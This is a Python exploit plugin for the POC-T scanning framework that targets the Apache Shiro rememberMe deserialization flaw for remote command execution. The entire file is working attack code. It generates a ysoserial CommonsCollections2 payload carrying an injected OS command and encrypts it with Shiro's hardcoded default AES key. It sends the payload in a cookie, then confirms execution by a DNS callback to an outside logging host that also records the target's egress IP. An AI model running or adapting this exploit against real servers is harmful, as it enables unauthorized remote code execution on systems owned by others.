#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
Apache Shiro 反序列化 远程命令执行

python POC-T.py -s shiro-deserial-rce -iS 127.0.0.1:8080

"""

import os
import re
import base64
import uuid
import subprocess
import requests
from Crypto.Cipher import AES
from plugin.cloudeye import CloudEye

JAR_FILE = '/home/xy/exps/ysoserial/target/ysoserial-0.0.5-SNAPSHOT-all.jar'


def poc(url):
    if '://' not in url:
        target = 'https://%s' % url if ':443' in url else 'http://%s' % url
    else:
        target = url
    try:
        cloudeye = CloudEye()
        domain = cloudeye.getRandomDomain('shiro')  # 设置dns特征域名组
        rce_command = 'ping -n 3 %s || ping -c 3 %s' % (domain, domain)  # 目标机执行的代码
        payload = generator(rce_command, JAR_FILE)  # 生成payload
        requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=10)  # 发送验证请求

        dnslog = cloudeye.getDnsRecord(delay=2)
        if domain in dnslog:
            msg = url
            for each in re.findall(r'client (.*)#', dnslog):  # 获取出口ip
                msg += ' - ' + each
            return msg

    except Exception, e:
        pass
    return False


def generator(command, fp):
    if not os.path.exists(fp):
        raise Exception('jar file not found!')
    popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections2', command],
                             stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = "kPH+bIxk5D2deZiIxcaaaA=="
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext
